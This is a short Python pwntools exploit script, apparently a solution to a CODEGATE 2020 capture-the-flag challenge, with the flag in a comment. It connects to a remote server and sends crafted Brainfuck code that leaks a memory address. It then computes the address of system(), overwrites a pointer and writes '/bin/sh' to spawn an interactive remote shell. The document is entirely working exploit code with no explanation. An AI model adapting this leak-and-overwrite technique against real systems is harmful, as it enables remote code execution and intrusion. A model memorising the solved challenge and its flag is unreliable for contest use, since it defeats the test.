#!/usr/bin/env python
# coding: utf-8

from pwn import *

# CODEGATE2020{next_time_i_should_make_a_backend_for_bf_as_well}

p = remote('58.229.240.181', 7777)

offset = 0x68
bf_code = '+[' + offset * '<' + '[' + offset * '>' + '-' + '<' * offset
bf_code += '>>>>>>>>' + '.>' * 8 + '<' * 16 + ',>' * 8 + (offset-8) * '>' + ']]'
p.recvuntil('>>> ', drop=True)
p.sendline(bf_code)

leaked = u64(p.recvuntil('\x7f\x00\x00'))
print('[+] leaked: {:#x}'.format(leaked))
system = leaked + 0x69c3c6a
print('[+] system: {:#x}'.format(system))

p.send(p64(system))

# input /bin/sh and modify to system
p.recvuntil('>>> ', drop=True)
bf_code = ',>' * 8
p.sendline(bf_code)
p.send('/bin/sh\0')

# trigger system
p.recvuntil('>>> ', drop=True)
p.sendline('++++')

p.interactive()
